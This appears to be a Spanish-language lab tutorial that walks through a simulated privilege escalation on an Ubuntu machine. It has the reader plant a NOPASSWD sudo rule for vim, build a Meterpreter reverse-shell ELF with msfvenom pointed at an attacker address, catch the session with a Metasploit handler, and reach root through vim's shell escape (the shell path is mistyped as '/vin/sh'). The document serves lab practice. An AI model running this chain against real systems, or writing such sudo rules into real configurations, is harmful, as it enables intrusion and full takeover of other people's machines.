# Escalada de privilegios en maquina ubuntux64
Simulación de un ataque de escalada de privilegios en la misma red local a través de un shell inverso generado con metasploit

## Configuraciones previas:
Debemos comprobar que el firewall está inactivo o no limita el tráfico entre máquinas antes de ejecutar el ataque.
### Máquina víctima:
Primero, crearemos la vulnerabilidad en la máquina víctima. Editamos el archivo /etc/sudoers a través del siguiente comando:

  `sudo visudo /etc/sudoers`

Una vez nos encontremos en la edición del archivo, añadimos al final la siguiente línea:

  `user  ALL=NOPASSWD:/usr/bin/vim`

"user" se refiere al usuario sin privilegios en la máquina objetivo.

## Replicación del ataque
Utilizaremos `msfvenom` para generar el archivo con código malicioso:

  `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[IP del atacante] LPORT = [puerto de escucha del atacante] -f elf > nombrearchivo.elf`

Copiamos el archivo en la máquina objetivo

Iniciamos Metasploit con el comando `msfconsole` para ejecutar un servicio de escucha en la IP y puerto que hayamos especificado al generar el código malicioso

  `use exploit/multi/handler`
  
  `set LHOST [IP del atacante]`
  
  `set LPORT [puerto de escucha]`
  
  `run`

Ahora, con el servicio de escucha activo en la máquina atacante, ejecutamos el archivo en la máquina objetivo con la cuenta de bajos privilegios.

  `./nombrearchivo.elf`

Volvemos a la máquina atacante y vemos que se ha iniciado una sesión en meterpreter. 

Ejecutamos el comando `shell` para obtener acceso a la terminal.

Para ver que comandos puede ejecutar con privilegios el usuario al que hemos accedido, ejecutamos `sudo -l`

Nos devolverá que el usuario puede ejecutar el binario de vim: `/usr/bin/vim`

Para obtener acceso a una terminal como "root" ejecutamos el siguiente comando: `sudo -u root /usr/bin/vim -c ':!/vin/sh'`

Ya hemos conseguido acceso como root en la maquina víctima
